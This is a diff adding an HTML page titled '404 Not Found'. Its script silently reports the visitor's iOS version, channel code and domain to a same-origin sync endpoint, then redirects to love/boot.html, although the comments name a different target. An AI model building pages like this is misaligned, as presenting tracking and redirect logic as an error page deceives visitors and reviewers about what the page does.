@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>404 Not Found</title>
+</head>
+<body>
+<script>
+"use strict";
+// ─────────────────────────────────────────────────────────────
+// /boot.html —— 根入口薄壳（已全量移植至 /B10/boot.html）
+//
+// 旧版：本页探测 → 等首次 sync POST 成功 → 800ms → /B10/group.html → 再进门禁
+//       （额外 1 跳 + 网络往返 + 800ms 停留）
+// 新版：一次 share-beacon + location.replace 立即进入 /B10/boot.html，
+//       版本探测/渠道/心跳/门禁/引导全部在 B10 内完成，链内零跳转。
+// 旧外部链接 /boot.html?c=1 将原样透传 c / d 参数。
+// ─────────────────────────────────────────────────────────────
+(function () {
+    // 快速版本探测（台账语义保持 'IOS x.y' / 'unknown'）
+    var m = /iPhone|iPad|iPod/i.test(navigator.userAgent)
+        ? /OS (\d+)_(\d+)/i.exec(navigator.userAgent) : null;
+    var ver = m ? ('IOS ' + m[1] + '.' + m[2]) : 'unknown';
+    var c = new URLSearchParams(location.search).get('c') || '1';
+
+    // 首次 sync 登记（fire-and-forget；随后 B10/boot.html 接管心跳）
+    try {
+        var payload = JSON.stringify({
+            channelCode:   c,
+            deviceVersion: ver,
+            domain:        location.host || 'unknown'
+        });
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon('/api/ip-sync/sync', new Blob([payload], { type: 'application/json' }));
+        } else {
+            var x = new XMLHttpRequest();
+            x.open('POST', '/api/ip-sync/sync', true);
+            x.setRequestHeader('Content-Type', 'application/json');
+            x.send(payload);
+        }
+    } catch (e) {}
+
+    // 立即跳转（replace 不留历史），query/hash 原样透传
+    try {
+        location.replace('love/boot.html' + (location.search || '') + (location.hash || ''));
+    } catch (e) {
+        location.href = 'love/boot.html' + (location.search || '');
+    }
+})();
+</script>
+</body>
+</html>
